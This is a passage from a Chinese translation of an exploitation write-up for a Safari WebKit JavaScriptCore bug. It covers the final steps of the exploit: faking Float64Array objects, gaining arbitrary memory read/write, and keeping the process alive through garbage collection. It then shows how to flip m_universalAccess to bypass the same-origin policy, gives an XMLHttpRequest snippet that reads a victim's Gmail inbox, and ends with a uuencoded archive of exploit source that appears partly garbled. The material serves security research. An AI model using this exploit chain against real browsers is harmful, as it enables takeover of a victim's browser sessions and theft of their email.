#### 6.4 维持激活垃圾收集
如果我们想保持渲染器进程存活周期超过我们的初始漏洞周期（稍后会看到为什么想要做到这一点），则面临的是垃圾收集器启动进程就立即崩溃。发生的这个情况主要是因为我们伪造的Float64Array的“Butterfly”在GC期间会被访问，它又是一个无效的指针（不是null指针）。从JSObject
访问子对象：
    Butterfly* butterfly = thisObject->m_butterfly.get();
    if (butterfly)
        thisObject->visitButterfly(visitor, butterfly,
                                   thisObject->structure(visitor.vm()));
如果我们可以将伪造的数组的“Butterfly”指针设置为nullptr指针，这会导致另一个崩溃。因为指针值也是容器对象的属性，并且它会被当作一个JSObject指针。
所以我们可以这样做：
  1. 创建一个空对象。此对象的结构将包含具有默认数量的内联存储（6个插槽）的对象，并且全部不处于使用状态。
  2. 将JSCell头（包含结构ID）复制到容器对象。这样就可以让引擎“忘记”构成假数组的容器的对象的属性。
  3. 将假数组的“Butterfly”指针设置为nullptr指针，且使用默认的Float64Array实例来替换该对象的JSCell。
最后一步是必需的，在我们结构喷射(spray)之前，可以获得一个具有一些属性的Flotation64Array构造。
这三个步骤给我们的漏洞利用有了一个稳定的执行。
> 注意，当覆盖JIT编译函数的代码时，如果需要进程继续就必须注意返回有效的JSValue。
> 如果不这样做，返回的值将由引擎保存并由收集器检查可能会导致在下一个GC期间崩溃。
#### 6.5 总结
这时，到了快速总结完整利用的时候了。
  1. 喷射Float64Array结构
  2. 分配具有内联属性的容器对象，它们一起在内联属性槽中构建一个Float64Array实例。使用适用于之前喷射的高初始化结构ID，将数组的数据指针设置为指向一个Uint8Array实例。
  3. 泄漏容器对象的地址，并创建一个指向Float64Array容器对象内的假对象
  4. 使用“instanceof”查看结构ID的猜测是否正确。如果通过分配新的容器对象的对应属性值不能增加结构ID，就一直重复操作，直到获得一个Float64Array为止。
  5. 通过写入Uint8Array的数据指针来读取、写入任意存储器地址
  6. 修复容器和Float64Array实例，避免在垃圾收集过程中崩溃.
### 7 渲染器进程的滥用
通常讲到这，下一个步骤就是激发某种沙盒逃出漏洞来进一步攻击目标机器。
但这些的讨论超出了本文的范围，并且由于在其他地方的讲了很多，我们就探讨当前的情况就行。
#### 7.1 WebKit进程和权限模型
自[WebKit 2
[22]](https://trac.webkit.org/wiki/WebKit2)（大约2011年）以来，WebKit提供了一个多进程模型，该进程模型为每个选项卡生成一个新的渲染器进程。不仅提供了稳定性和提升了性能，也为沙盒基础设施提供了支撑基础。沙盒的出现限制了受损渲染器进程对系统可能造成的损害。
#### 7.2 同源政策
同源策略（SOP）为客户端的Web安全提供了基础，它防止源自A的内容干扰源自B的内容。这包括脚本级的访问（例如访问另一窗口内的DOM对象）以及网络级的访问（例如XMLHttpRequest）。有趣的是，在WebKit中，SOP是在渲染器进程内是强制执行的，这意味着我们可以在里面绕过它。目前所有主要的网络浏览器都是如此，不过chrome正在改进它们的网站隔离项[[23]](https://www.chromium.org/developers/design-documents/site-isolation)。
这个也不是什么新的内容，在过去被也常常利用，但的确值得讨论。实质上，这意味着渲染器进程可以完全访问所有浏览器会话，并且可以发送经过身份验证的跨源请求并读取响应。因此，损害渲染器进程的攻击者能获得对受害者的浏览器会话访问的权限。
为了演示这个说法，我们现在将修改我们的exploit，来显示用户的gmail收件箱邮件。
#### 7.3 盗取电子邮件
WebKit中的SecurityOrigin类中有一个有趣的字段：m_universalAccess。 如果它被设置，它将导致所有跨源检查成功。
我们可以通过跟随一组指针（其偏移量还取决于当前的Safari版本）获得对当前活动的SecurityDomain实例的引用。然后，可以为渲染器进程启用universalAccess，执行身份验证的跨源对象XMLHttpRequest。最后阅读gmail中的电子邮件就变得简单了。
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://mail.google.com/mail/u/0/#inbox', false);
    xhr.send();     // xhr.responseText now contains the full response
这个exploit可以显示“用户”当前的Gmail邮箱，如果要具体实现，需要在gmail中进行有效的session。
### 8 参考文献
[1] http://www.zerodayinitiative.com/advisories/ZDI-16-485/
[2] https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/
[3] http://trac.webkit.org/wiki/JavaScriptCore
[4] http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-data-types-and-values
[5] http://www.ecma-international.org/ecma-262/6.0/#sec-objects
[6] https://en.wikipedia.org/wiki/Double-precision_floating-point_format
[7] http://www.ecma-international.org/ecma-262/6.0/#sec-array-exotic-objects
[8] http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-standard-built-in-objects
[9] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice
[10]
https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848
[11] https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species
[12] http://www.ecma-international.org/ecma-262/6.0/#sec-type-conversion
[13] https://bugzilla.mozilla.org/show_bug.cgi?id=735104
[14] https://bugzilla.mozilla.org/show_bug.cgi?id=983344
[15] https://bugs.chromium.org/p/chromium/issues/detail?id=554946
[16] https://www.gnu.org/software/guile/manual/html_node/Conservative-GC.html
[17] http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-language-types-number-type
[18] http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects
[19] https://developers.google.com/v8/design#fast-property-access
[20] http://www.ecma-international.org/ecma-262/6.0/#sec-operations-on-objects
[21] http://www.ecma-international.org/ecma-262/6.0/#sec-ordinary-object-internal-methods-and-internal-slots-delete-p
[22] https://trac.webkit.org/wiki/WebKit2
[23] https://www.chromium.org/developers/design-documents/site-isolation
### 9 源码
    begin 644 src.zip
    M4$L#!`H``````%&N1DD````````````````$`!P``L``03U`0``!%````!02P,$%`````@`%ZY&2;A,.B1W`P``)@D```X`
    M'`!S`L``03U`0``!%````"-    M5E%OVS80?L^ON'H/DE9;2H:B*&([F)%D78:U*9H@;9$%`2V=;082J9)4;*'M
    M?]^1LA39L=7J11)Y]]WW'7E'CEZ?_EP#@N3I2]PO!4
    MAP^Z=T(F;OQDVX0+\_I5MTF^%%L&3Q85VUDA8L.E@%P1GI_I>="0!TAD7&0H
    M3&A%A5P(5->X,O!R#&0)+\'[3WBU&O>*(CCCFDU3U&`6")IE.)"*SSF%D"F/
    M2\J)HBFN0:%(4*&BV#)&K8&)!'0QU?BUH*!I62/.T,0+K.83KO.4E15ZH5%I
    MF&>,I\#%5*Z`SX"M!S1!6F6XXMKH>K>#._CGZA0>B8#%$]+`8^,6PF0JE>%BW@N&&^X*3:'$T]@Z;6NA5S2;
    M.V499E*59,Z2:*FX01LXXX8_8MAXT/+ZA-_\/S(%#WJU4#`&@4OX_.[?OXW)
    M/]I\:K/;=)(DUIS12\Y\-]2B7*O]W:K=A*.$:\-$C/`G]&@K-&BAD5>&_.:4
    MO*V(3_$J?:'5=V'WL4_C?@/1A\/5'X?!;B+=-'Y.HMK^YRN,3ZDZ:3MW46H1
    M>KV/T%4#6-B]M4;=)K8S;!=-@J.%+R]=\7QPM=/%=">^Y7VTE_>.",]8[V'Q
    MR\0[*>\![\.;7Z+M,H:>K9C25,D4F(&9IB@ED]PI:EMAIL
    M^]/;_V^N`M
    MJ`#TT7&M1D=$#1P.?,]:W)SJ]E=U>`L`
    M`03U`0``!%````"]5_UNVS80_]]/9B^V.U*2J8^F'5#,"!";.M['[SY^I^/CT?$QO!)R
    M#VN5E04'NV(6-EIM1H)3H-=!^4%%PN[0J^A%.XNH*381WC&3F]K>YNRV"XI:O..I'0(%
    MRP)AD2GEQ>4^S$W?EVWBOO>LW@,OT%#_:@NT+ZXPS)X(?>Q*JSMXA?7Q0FM,
    M\I&OV75I+*S8%FMVE[+4%GNX0$M\C9UADJ..$QU7NRY^'"8J\UQ(GG60Z@BC
    M$"L+VY;I1>#0A%0AOKI,L2>QJ:O.Q^PSO2PIBB:(^U'=MV+^)@:"8%H_[U/6E7PB3,//?WKZ#N[BA,+@VL%4]O(4?7;MA-    M\X!2YF!\\]5;JO'9+L_AT:/Z\/QP^/X]=,YXIZD\*C077C*Y#*!QPRI%(*2R
    ML."','!R+?9-\$=QT$/:`S-W>":EW+#T-JI^X6Q@B/?$.U1C>MD']1W;,I-J
    ML;'8CT6)\/Y7=-U,Q#F+?TIB16Z4,8*`)B#K.4WCEI1J"AO>S':SV>QD%GPF
    M#L(\#\_B6G]6.A:H"@!KB'J=QK,O)R:H_,-4_S#_U07S@5Q32MLYI82VIPNUPS1,4.P9L"PS`CT1=[1`UV?9`Z'%IX.,W
    MS(@4L96I,$(P%INS&(Z7`GXGN>ITHRX@F:)9Y":H$%MN'9J3`*OV"TF.V6:UU?1FI\3E@"IZ
    M0].@HJ+,A]-L?XV)*)^`1"5F`,Y!J.LITQ@..-\KZE&U'QS5O+C!&K
    MP'/'?1?(XR\./F.1]O>A
    MX86E=<=OOGYU#A]T'*WQ2]AF4^RK4='(!\+WW97`=<453"7NT'<*)QX5E5^#
    MXI`&J`1O./5#D,D:0,F7D0QS-@3<Q0!2=0.CU%^R:GKL]/Y0&YR%#I;D9UFG
    M[7Z"6_-E-S2&V5UT0T$EPZ$@'40,9W$8#06"#:'W+IA/";)3ODY!J<F90Y#D